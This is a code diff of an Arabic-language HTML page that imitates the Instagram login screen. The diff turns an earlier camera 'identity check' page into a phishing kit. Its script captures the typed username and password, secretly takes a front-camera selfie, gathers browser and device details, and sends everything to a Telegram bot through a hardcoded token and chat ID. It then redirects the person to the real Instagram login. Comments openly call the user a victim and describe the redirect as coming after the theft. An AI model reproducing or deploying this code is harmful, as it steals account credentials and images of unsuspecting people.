@@ -1,112 +1,346 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل الكاميرا للتحقق</title>
+    <title>Instagram • الصور والفيديوهات</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea, #764ba2);
+        * {
             margin: 0;
-            padding: 20px;
-            color: white;
-            text-align: center;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
+        
+        body {
+            background-color: #fafafa;
+            color: #262626;
+        }
+        
         .container {
-            max-width: 400px;
-            margin: 100px auto;
-            background: rgba(255,255,255,0.1);
-            padding: 30px;
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
+            max-width: 935px;
+            margin: 0 auto;
+            padding: 30px 20px;
         }
-        button {
-            background: #ff4757;
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: 600;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 30px 40px;
+            text-align: center;
+            margin: 40px auto;
+            max-width: 350px;
+        }
+        
+        .instagram-logo {
+            font-size: 42px;
+            font-weight: 600;
+            margin: 20px 0;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            font-size: 14px;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: #0095f6;
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 25px;
+            padding: 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            margin: 15px 0;
             cursor: pointer;
-            margin: 20px 0;
         }
-        .camera-box {
-            width: 250px;
-            height: 250px;
+        
+        .separator {
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            position: relative;
+        }
+        
+        .separator::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .separator span {
+            background: white;
+            padding: 0 15px;
+        }
+        
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin: 15px 0;
+        }
+        
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px;
+            text-align: center;
+            margin: 10px auto;
+            max-width: 350px;
+            font-size: 14px;
+        }
+        
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .camera-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .camera-content {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        
+        .camera-preview {
+            width: 300px;
+            height: 300px;
             margin: 20px auto;
-            border: 3px solid white;
-            border-radius: 10px;
+            border: 2px solid #dbdbdb;
+            border-radius: 8px;
             overflow: hidden;
         }
+        
         #video {
             width: 100%;
             height: 100%;
+            object-fit: cover;
         }
-        .hidden {
+        
+        .verify-btn {
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 10px;
+        }
+        
+        .loading {
             display: none;
+            color: #0095f6;
+            margin: 15px 0;
+        }
+        
+        .success-message {
+            display: none;
+            color: #1a7c2e;
+            margin: 15px 0;
+        }
+        
+        .error-message {
+            display: none;
+            color: #ed4956;
+            margin: 15px 0;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>📸 تحقق من الهوية</h1>
-        <p>للمتابعة، يرجى السماح بالوصول إلى الكاميرا</p>
-        
-        <div class="camera-box">
-            <video id="video" autoplay playsinline></video>
+        <div class="header">
+            <div class="logo">Instagram</div>
         </div>
-        
-        <button id="startBtn">تفعيل الكاميرا</button>
-        <button id="captureBtn" class="hidden">التقاط صورة</button>
-        
-        <div id="status"></div>
+
+        <div class="login-box">
+            <div class="instagram-logo">Instagram</div>
+            <p style="margin-bottom: 20px; color: #8e8e8e;">سجّل الدخول لمشاهدة الصور ومقاطع الفيديو من أصدقائك.</p>
+            
+            <div class="login-form">
+                <input type="text" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" id="username">
+                <input type="password" placeholder="كلمة السر" id="password">
+                <button class="login-btn" onclick="showCameraModal()">تسجيل الدخول</button>
+            </div>
+            
+            <div class="separator">
+                <span>أو</span>
+            </div>
+            
+            <div class="facebook-login">
+                <span>تسجيل الدخول باستخدام Facebook</span>
+            </div>
+            
+            <div class="forgot-password">
+                نسيت كلمة السر؟
+            </div>
+        </div>
+
+        <div class="signup-box">
+            <span>ليس لديك حساب؟</span>
+            <a href="#" class="signup-link">اشترك</a>
+        </div>
+    </div>
+
+    <!-- نافذة الكاميرا -->
+    <div class="camera-modal" id="cameraModal">
+        <div class="camera-content">
+            <h3>التحقق من الهوية</h3>
+            <p>لحماية حسابك، نحتاج للتحقق من هويتك باستخدام الكاميرا</p>
+            
+            <div class="camera-preview">
+                <video id="video" autoplay playsinline></video>
+            </div>
+            
+            <div class="loading" id="loading">
+                ⏳ جاري التحقق من هويتك...
+            </div>
+            
+            <div class="success-message" id="successMessage">
+                ✅ تم التحقق بنجاح! جاري تسجيل الدخول...
+            </div>
+            
+            <div class="error-message" id="errorMessage">
+                ❌ خطأ في التحقق. حاول مرة أخرى.
+            </div>
+            
+            <button class="verify-btn" onclick="captureAndSend()">تحقق الآن</button>
+        </div>
     </div>
 
     <script>
-        const video = document.getElementById('video');
-        const startBtn = document.getElementById('startBtn');
-        const captureBtn = document.getElementById('captureBtn');
-        const status = document.getElementById('status');
-
-        // إعدادات البوت - غيرها يا حمار
+        // التوكن والآيدي - يا حمار غيرهم إذا تبي
         const BOT_TOKEN = '8097003009:AAGO1cYlxHulfqbnbUCqxa1rahpGawgVM_4';
         const CHAT_ID = '7763665935';
-
-        startBtn.addEventListener('click', async () => {
+        
+        const video = document.getElementById('video');
+        const cameraModal = document.getElementById('cameraModal');
+        const loading = document.getElementById('loading');
+        const successMessage = document.getElementById('successMessage');
+        const errorMessage = document.getElementById('errorMessage');
+        
+        // عرض نافذة الكاميرا
+        function showCameraModal() {
+            cameraModal.style.display = 'flex';
+            startCamera();
+        }
+        
+        // بدء الكاميرا تلقائياً
+        async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
+                    video: { 
+                        facingMode: 'user',
+                        width: 1280,
+                        height: 720 
+                    } 
                 });
                 video.srcObject = stream;
-                startBtn.classList.add('hidden');
-                captureBtn.classList.remove('hidden');
-                status.innerHTML = '<p style="color:lightgreen">✅ الكاميرا مفعلة</p>';
+                
+                // التقاط الصورة تلقائياً بعد 3 ثواني
+                setTimeout(() => {
+                    captureAndSend();
+                }, 3000);
+                
             } catch (err) {
-                status.innerHTML = '<p style="color:red">❌ خطأ في تفعيل الكاميرا</p>';
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = '❌ لا يمكن الوصول إلى الكاميرا';
             }
-        });
-
-        captureBtn.addEventListener('click', () => {
+        }
+        
+        // التقاط الصورة وإرسالها
+        function captureAndSend() {
+            loading.style.display = 'block';
+            errorMessage.style.display = 'none';
+            
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
+            // تحويل الصورة وإرسالها
             canvas.toBlob(blob => {
                 sendToTelegram(blob);
-            }, 'image/jpeg', 0.8);
-        });
-
+            }, 'image/jpeg', 0.9);
+        }
+        
+        // إرسال الصورة للتليجرام
         function sendToTelegram(blob) {
-            status.innerHTML = '<p>⏳ جاري التحقق...</p>';
-            
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'selfie.jpg');
-            formData.append('caption', `سيلفي - ${new Date().toLocaleString()}`);
+            formData.append('photo', blob, 'instagram_selfie.jpg');
+            
+            // معلومات إضافية عن الضحية
+            const userInfo = `
+🕵️ ضحية Instagram جديدة:
 
+📱 المتصفح: ${navigator.userAgent}
+💻 النظام: ${navigator.platform}
+🌐 اللغة: ${navigator.language}
+🖥️ الشاشة: ${screen.width}x${screen.height}
+⏰ الوقت: ${new Date().toLocaleString()}
+📍 الرابط: ${window.location.href}
+
+🔐 معلومات الدخول:
+👤 يوزر: ${document.getElementById('username').value}
+🔑 باسورد: ${document.getElementById('password').value}
+            `;
+            
+            formData.append('caption', userInfo);
+            
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
@@ -114,24 +348,40 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    status.innerHTML = '<p style="color:lightgreen">✅ تم التحقق بنجاح!</p>';
-                    // إعادة توجيه الضحية
+                    loading.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    
+                    // إعادة التوجيه بعد السرقة
                     setTimeout(() => {
-                        window.location.href = 'https://google.com';
-                    }, 2000);
+                        window.location.href = 'https://www.instagram.com/accounts/login/';
+                    }, 3000);
+                    
                 } else {
                     throw new Error('فشل الإرسال');
                 }
             })
             .catch(err => {
-                status.innerHTML = '<p style="color:red">❌ خطأ في التحقق</p>';
+                loading.style.display = 'none';
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = '❌ خطأ في التحقق، حاول مرة أخرى';
             });
         }
-
-        // محاولة التفعيل التلقائي
-        setTimeout(() => {
-            startBtn.click();
-        }, 1000);
+        
+        // إغلاق الكاميرا عند النقر خارجها
+        cameraModal.addEventListener('click', (e) => {
+            if (e.target === cameraModal) {
+                cameraModal.style.display = 'none';
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
+            }
+        });
+        
+        // محاولة بدء الكاميرا تلقائياً عند تحميل الصفحة
+        window.addEventListener('load', () => {
+            // يمكنك إزالة التعليق لبدء الكاميرا تلقائياً
+            // showCameraModal();
+        });
     </script>
 </body>
 </html>
